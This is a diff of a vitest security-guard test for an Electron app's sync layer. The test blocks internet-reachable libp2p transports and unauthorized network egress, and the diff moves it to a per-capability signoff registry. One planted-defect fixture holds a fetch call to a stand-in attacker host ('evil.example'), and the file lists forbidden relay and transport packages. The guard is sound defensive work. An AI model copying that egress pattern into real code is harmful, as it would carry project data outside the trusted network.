@@ -1,145 +1,171 @@
-// TIER-4 ENFORCEABLE BOUNDARY GUARD (docs/adr/2026-09-14-internet-transport-security-gate.md).
+// TIER-4 ENFORCEABLE BOUNDARY GUARD (docs/adr/2026-09-14-internet-transport-security-gate.md,
+// docs/adr/2026-09-27-wan-connectivity-hardening-ladder.md "Addendum 2026-09-28 (Architect, T288)").
 //
 // Shoresh's entire threat model rests on one assumption: the sync transport is reachable only
-// on the local network (loopback + mDNS-discovered LAN peers), never over the internet. The
-// moment an internet-reachable transport or discovery mechanism is added — a circuit relay, a
-// DHT, WebRTC/WebSocket/WebTransport, a bootstrap list, AutoNAT/UPnP hole-punching, or a
-// non-loopback default listen address — the "trusted private LAN" boundary is gone and a FULL
-// security re-assessment is mandatory (TLS/wss, authenticated relays, the plaintext-PIN-on-wire
-// tradeoff, internet-scale rate limiting, Electron auto-update integrity).
+// on the local network (loopback + mDNS-discovered LAN peers) plus whatever WAN capability has an
+// explicit, dated sign-off in transportCapabilities.js. The moment an internet-reachable transport
+// or discovery mechanism is added without a signoff entry — a circuit relay, a DHT, WebRTC/
+// WebSocket/WebTransport, a bootstrap list, AutoNAT/UPnP hole-punching, or a non-loopback default
+// listen address — a FULL security re-assessment is mandatory.
 //
-// This test makes that non-negotiable and mechanical instead of a doc nobody re-reads: it FAILS
-// the build if any internet-transport capability appears, UNTIL a human flips INTERNET_TRANSPORT_SIGNOFF
-// to true — which you may only do after the ADR's re-assessment is recorded. Flipping it forces
-// you to open this file and read the ADR pointer, which is exactly the checkpoint we want.
+// T288 replaced the old single coarse `INTERNET_TRANSPORT_SIGNOFF` boolean with a per-capability
+// registry (transportCapabilities.js): each capability is independently blocked/allowed, so
+// authorizing `discovery` cannot, by construction, also widen what `relay`/`dcutr`/etc. are
+// allowed to do. Every assertion below reads TRANSPORT_CAPABILITIES — none hard-codes a second
+// copy of "is X allowed".
 import { describe, it, expect } from 'vitest'
 import { readFileSync, readdirSync } from 'node:fs'
-import { findInternetEgress } from './internetRendezvousScan.js'
+import { findInternetEgress, forbiddenPackagesPresent, unauthorizedEgress } from './internetRendezvousScan.js'
+import {
+  TRANSPORT_CAPABILITIES,
+  ALL_FORBIDDEN_PACKAGES,
+  ALL_FORBIDDEN_MARKERS,
+  DISCOVERY_EGRESS_ALLOWLIST,
+} from './transportCapabilities.js'
 import { fileURLToPath } from 'node:url'
 import { dirname, join } from 'node:path'
+import path from 'node:path'
 
 const __dirname = dirname(fileURLToPath(import.meta.url))
 const repoRoot = join(__dirname, '..', '..', '..')
 
-// ── The sign-off switch ─────────────────────────────────────────────────────
-// FALSE = LAN-only boundary is in force (the shipped state). Set TRUE only after the
-// re-assessment in docs/adr/2026-09-14-internet-transport-security-gate.md is done and recorded.
-const INTERNET_TRANSPORT_SIGNOFF = false
+function walkSyncFiles() {
+  const syncDir = join(repoRoot, 'electron', 'sync')
+  const files = []
+  const walk = (dir) => {
+    for (const entry of readdirSync(dir, { withFileTypes: true })) {
+      const full = join(dir, entry.name)
+      if (entry.isDirectory()) walk(full)
+      else if (entry.name.endsWith('.js') && !entry.name.endsWith('.test.js')) files.push(full)
+    }
+  }
+  walk(syncDir)
+  return files
+}
 
-// libp2p packages (and multiaddr protocols) that imply internet reachability. Absence of these
-// is what keeps the boundary. This list is the definition of "internet-reachable" for the guard.
-const INTERNET_TRANSPORT_PACKAGES = [
-  '@libp2p/circuit-relay-v2',
-  '@libp2p/webrtc',
-  '@libp2p/websockets',
-  '@libp2p/webtransport',
-  '@libp2p/kad-dht',
-  '@libp2p/bootstrap',
-  '@libp2p/autonat',
-  '@libp2p/dcutr',
-  '@libp2p/upnp-nat',
-  // Added 2026-09-17 while re-checking this list against the 3.x package line for T215. Nothing was
-  // RENAMED across the major (all nine names above still resolve), but two internet transports were
-  // missing from the list entirely:
-  '@chainsafe/libp2p-quic',   // the QUIC transport. Not installable against libp2p 2.10 (it needs
-                              // @libp2p/interface@^3.x), which is why it was never listed — the
-                              // dependency graph was doing the guarding. The libp2p 3.x upgrade
-                              // (T215) satisfies that requirement incidentally, so from that moment
-                              // the only thing standing between this repo and a QUIC transport is
-                              // this line. Listing it now, BEFORE the bump, so the guard is armed
-                              // when the upgrade lands rather than one commit behind it.
-  '@libp2p/webrtc-direct',    // sibling of @libp2p/webrtc, which was listed; this one was not.
-]
-
-describe('Tier-4 internet-transport boundary guard', () => {
-  const pkg = JSON.parse(readFileSync(join(repoRoot, 'package.json'), 'utf8'))
-  const deps = { ...(pkg.dependencies ?? {}), ...(pkg.devDependencies ?? {}) }
+describe('Tier-4 internet-transport boundary guard (per-capability, T288)', () => {
+  const lockfile = JSON.parse(readFileSync(join(repoRoot, 'package-lock.json'), 'utf8'))
   const transportSrc = readFileSync(join(__dirname, 'transport.js'), 'utf8')
+  const starterSrc = readFileSync(join(__dirname, 'syncStarter.js'), 'utf8')
 
-  it('declares no internet-reachable libp2p transport/discovery dependency (unless signed off)', () => {
-    const present = INTERNET_TRANSPORT_PACKAGES.filter((p) => p in deps)
-    if (INTERNET_TRANSPORT_SIGNOFF) return // re-assessment recorded; boundary deliberately opened
-    expect(present, `Internet-transport dependency added without sign-off: ${present.join(', ')}. ` +
-      `The trusted-LAN threat model no longer holds. Complete the re-assessment in ` +
-      `docs/adr/2026-09-14-internet-transport-security-gate.md, then set INTERNET_TRANSPORT_SIGNOFF=true here.`
+  // ── 1.1 Package presence — resolved tree, not direct deps ────────────────────────────────
+  it('declares no un-signed-off internet-transport dependency, anywhere in the resolved tree', () => {
+    const present = forbiddenPackagesPresent(lockfile.packages, ALL_FORBIDDEN_PACKAGES())
+    expect(present, `Un-signed-off transport package present in the resolved dependency tree ` +
+      `(direct or transitive): ${present.join(', ')}. Add a signoff entry in transportCapabilities.js ` +
+      `only after the ADR re-assessment for that capability is recorded.`
     ).toEqual([])
   })
 
-  it('the REAL production node uses mDNS-only discovery, no internet rendezvous (unless signed off)', () => {
-    if (INTERNET_TRANSPORT_SIGNOFF) return
-    // CORRECTION (2026-09-15 WAN assessment, finding 1): the earlier version of this test asserted
-    // transport.js's DEFAULT_LISTEN stays loopback — but that constant is DEAD in production. The
-    // real node (electron/main.js, via syncStarter.js — see below) binds `/ip4/0.0.0.0/tcp/0` (all
-    // interfaces — necessary for LAN sync; loopback would let nothing connect). So "loopback" was
-    // never the boundary. The boundary that actually keeps this off the internet is DISCOVERY: the
-    // production node is wired with `createMdnsDiscovery` (link-local multicast) and NOTHING that
-    // performs internet rendezvous (DHT/bootstrap/relay). This test asserts that real wiring, so the
-    // guard can no longer be satisfied while the actual bind/discovery has already widened.
-    //
-    // T276: the startSyncNode() call site (and this mDNS wiring) moved out of main.js's
-    // `!process.env.VITEST`-gated block into electron/sync/automerge/syncStarter.js, so this
-    // wiring assertion now reads THAT file — a pure extraction, not a boundary change.
-    const starterSrc = readFileSync(join(__dirname, 'syncStarter.js'), 'utf8')
-    expect(/peerDiscovery:\s*\[\s*createMdnsDiscovery\(/.test(starterSrc),
-      'electron/sync/automerge/syncStarter.js no longer wires mDNS-only discovery (createMdnsDiscovery) ' +
-      'into startSyncNode — if internet discovery (DHT/bootstrap/relay rendezvous) was added, the ' +
-      'trusted-LAN boundary is gone; complete docs/adr/2026-09-14-internet-transport-security-gate.md ' +
-      'and set INTERNET_TRANSPORT_SIGNOFF=true.'
-    ).toBe(true)
-    for (const marker of ['kadDHT', 'circuitRelay', 'bootstrap(', 'dcutr', 'autonat', 'webRTC']) {
-      expect(starterSrc.includes(marker),
-        `electron/sync/automerge/syncStarter.js references '${marker}' — an internet rendezvous/transport ` +
-        `was wired into the production node. That is the boundary change this gate exists to catch.`
-      ).toBe(false)
+  // ── 1.2 syncStarter marker assertions — asymmetric per capability ────────────────────────
+  it('syncStarter.js wires discovery when (and only when) discovery has a signoff', () => {
+    const discoveryOn = Boolean(TRANSPORT_CAPABILITIES.discovery.signoff)
+    const wiresMdns = /peerDiscovery\s*=\s*\[\s*createMdnsDiscovery\(/.test(starterSrc)
+    expect(wiresMdns, 'mDNS discovery must remain wired, and first, regardless of the discovery capability state').toBe(true)
+    if (discoveryOn) {
+      expect(/createRendezvousDiscovery\(/.test(starterSrc),
+        'discovery.signoff is set in transportCapabilities.js but syncStarter.js does not reference ' +
+        'createRendezvousDiscovery( — a signed-off-but-never-wired flag reads as compliant when it is ' +
+        'not; wire the capability or remove the signoff.'
+      ).toBe(true)
     }
   })
 
-  // T207 (docs/work/tickets/T207-tier4-guard-blind-to-http-rendezvous.md). The three assertions
-  // above are package-shaped and marker-shaped, and the rendezvous design in
-  // docs/work/specs/2026-09-17-rendezvous-wan-connectivity.md defeats all three without malice: an
-  // HTTPS fetch to a Cloudflare Worker is not an npm libp2p package, is not imported by
-  // transport.js, and a rendezvous service appended AFTER createMdnsDiscovery( still satisfies that
-  // regex. A node could publish its real WAN addresses to a public bulletin board with a green
-  // gate. So the boundary is also asserted BEHAVIOURALLY: the sync path reaches the network only
-  // through libp2p, to peers found on the link-local network. Any outbound internet egress of its
-  // own — by any name, in any file — is the boundary change this gate exists to catch.
-  // The detection is a separately-tested pure function; see internetRendezvousScan.js for what it
-  // can and cannot see.
-  it('the sync path performs no internet egress of its own (unless signed off)', () => {
-    if (INTERNET_TRANSPORT_SIGNOFF) return
-    const syncDir = join(repoRoot, 'electron', 'sync')
-    const files = []
-    const walk = (dir) => {
-      for (const entry of readdirSync(dir, { withFileTypes: true })) {
-        const full = join(dir, entry.name)
-        if (entry.isDirectory()) walk(full)
-        else if (entry.name.endsWith('.js') && !entry.name.endsWith('.test.js')) files.push(full)
-      }
-    }
-    walk(syncDir)
-    // The scanner itself names egress primitives in its own pattern table, so exclude it.
-    const scanned = files.filter((f) => !f.endsWith('internetRendezvousScan.js'))
-    expect(scanned.length, 'no sync source files found — the walk is broken, not the tree clean').toBeGreaterThan(5)
+  it('syncStarter.js references no marker of a still-blocked capability', () => {
+    const forbiddenMarkers = ALL_FORBIDDEN_MARKERS()
+    const present = forbiddenMarkers.filter((m) => starterSrc.includes(m))
+    expect(present, `syncStarter.js references blocked-capability marker(s): ${present.join(', ')}.`).toEqual([])
+  })
 
-    const offenders = scanned
-      .map((f) => [f.slice(repoRoot.length + 1), findInternetEgress(readFileSync(f, 'utf8'))])
-      .filter(([, hits]) => hits.length > 0)
-      .map(([rel, hits]) => `${rel} (${hits.join(', ')})`)
+  // ── 1.3 Behavioral egress scan — allowlist by exact file identity ────────────────────────
+  it('the sync path performs no internet egress outside the signed-off discovery allowlist', () => {
+    const files = walkSyncFiles().filter((f) => !f.endsWith('internetRendezvousScan.js'))
+    expect(files.length, 'no sync source files found — the walk is broken, not the tree clean').toBeGreaterThan(5)
+
+    const entries = files.map((f) => ({
+      relPath: f.slice(repoRoot.length + 1),
+      basename: path.basename(f),
+      source: readFileSync(f, 'utf8'),
+    }))
+    const discoveryOn = Boolean(TRANSPORT_CAPABILITIES.discovery.signoff)
+    const offenders = unauthorizedEgress(entries, { discoveryOn, allowlist: DISCOVERY_EGRESS_ALLOWLIST })
 
     expect(offenders,
-      `The sync path now reaches the internet directly: ${offenders.join('; ')}. ` +
-      `Shoresh's threat model assumes sync traffic goes only through libp2p to link-local peers; ` +
-      `an internet rendezvous client (e.g. a Cloudflare Worker bulletin board) removes that ` +
-      `assumption even though it adds no libp2p package. Complete the re-assessment in ` +
-      `docs/adr/2026-09-14-internet-transport-security-gate.md, then set INTERNET_TRANSPORT_SIGNOFF=true here.`
+      `Unauthorized internet egress: ${offenders.join('; ')}. Only the files named in ` +
+      `TRANSPORT_CAPABILITIES.discovery.egressAllowlist may perform their own egress, and only while ` +
+      `discovery has a signoff entry.`
     ).toEqual([])
   })
 
+  // ── 1.4 transport.js import scan — registry-driven ────────────────────────────────────────
   it('transport.js imports no internet-transport package directly (unless signed off)', () => {
-    if (INTERNET_TRANSPORT_SIGNOFF) return
-    const importedInternet = INTERNET_TRANSPORT_PACKAGES.filter((p) =>
+    const importedInternet = ALL_FORBIDDEN_PACKAGES().filter((p) =>
       new RegExp(`from\\s+['"]${p.replace(/[/\\^$*+?.()|[\]{}]/g, '\\$&')}['"]`).test(transportSrc)
     )
     expect(importedInternet, `transport.js imports an internet transport: ${importedInternet.join(', ')}`).toEqual([])
+  })
+})
+
+// ── Non-vacuity — plants defects the registry-driven assertions above must still catch ───────
+// (T288 addendum §6, seams 1-3: "plant the defect the guard cannot see", not just the defect the
+// guard was designed around.)
+describe('Tier-4 guard — non-vacuity (planted defects)', () => {
+  it('seam 1: a relay package still goes red EVEN WITH discovery signed off', () => {
+    // discovery.signoff IS set in the real registry (checked_in state) — this proves flipping
+    // discovery does not widen what the relay check tolerates.
+    expect(Boolean(TRANSPORT_CAPABILITIES.discovery.signoff)).toBe(true)
+    const plantedLockfilePackages = {
+      'node_modules/@libp2p/circuit-relay-v2': {},
+    }
+    const present = forbiddenPackagesPresent(plantedLockfilePackages, ALL_FORBIDDEN_PACKAGES())
+    expect(present).toEqual(['@libp2p/circuit-relay-v2'])
+  })
+
+  it('seam 2: a transitive/nested package path is still caught (not direct-deps-only)', () => {
+    const plantedLockfilePackages = {
+      'node_modules/some-wrapper/node_modules/@libp2p/circuit-relay-v2': {},
+    }
+    const present = forbiddenPackagesPresent(plantedLockfilePackages, ALL_FORBIDDEN_PACKAGES())
+    expect(present).toEqual(['@libp2p/circuit-relay-v2'])
+  })
+
+  it('seam 3: a file imported only by the discovery client is still flagged by its own basename', () => {
+    // The importer-inheritance exploit: relayBridge.fixture.js is imported only by a stand-in for
+    // rendezvousClient.js, but egress scope is file-identity-based, never import-graph-based.
+    const entries = [
+      { relPath: 'electron/sync/automerge/rendezvousClient.js', basename: 'rendezvousClient.js', source: `import './relayBridge.fixture.js'\nexport const x = 1` },
+      { relPath: 'electron/sync/automerge/relayBridge.fixture.js', basename: 'relayBridge.fixture.js', source: `export async function bridge() { return fetch('https://evil.example/relay') }` },
+    ]
+    const offenders = unauthorizedEgress(entries, { discoveryOn: true, allowlist: DISCOVERY_EGRESS_ALLOWLIST })
+    expect(offenders.some((o) => o.startsWith('electron/sync/automerge/relayBridge.fixture.js'))).toBe(true)
+  })
+
+  it('the discovery-allowlisted file itself is exempt only while discovery is on', () => {
+    const entries = [
+      { relPath: 'electron/sync/automerge/rendezvousClient.js', basename: 'rendezvousClient.js', source: `fetch('https://example.com')` },
+    ]
+    expect(unauthorizedEgress(entries, { discoveryOn: true, allowlist: DISCOVERY_EGRESS_ALLOWLIST })).toEqual([])
+    expect(unauthorizedEgress(entries, { discoveryOn: false, allowlist: DISCOVERY_EGRESS_ALLOWLIST }).length).toBe(1)
+  })
+
+  it('dynamic import()/computed require() pattern does not false-positive on syncStarter.js\'s static import', () => {
+    const starterSrc = readFileSync(join(__dirname, 'syncStarter.js'), 'utf8')
+    expect(findInternetEgress(starterSrc)).toEqual([])
+  })
+
+  it('dynamic import() pattern DOES flag a computed specifier', () => {
+    expect(findInternetEgress(`const mod = await import(somePath)`)).toContain('dynamic import()/computed require()')
+  })
+})
+
+// ── Seam 8 — LAN-only parity when discovery is disabled ──────────────────────────────────────
+describe('Tier-4 guard — LAN-only parity regression', () => {
+  it('mDNS discovery stays wired in syncStarter.js regardless of the discovery capability state', () => {
+    const starterSrc = readFileSync(join(__dirname, 'syncStarter.js'), 'utf8')
+    expect(/peerDiscovery\s*=\s*\[\s*createMdnsDiscovery\(/.test(starterSrc),
+      'electron/sync/automerge/syncStarter.js no longer wires mDNS-only discovery as the first ' +
+      'peerDiscovery entry — the LAN-only path must stay byte-identical when SHORESH_RENDEZVOUS_URL ' +
+      'is unset. See readRendezvousConfig() in rendezvousClient.js and mainSyncStartupWiring.test.js.'
+    ).toBe(true)
   })
 })
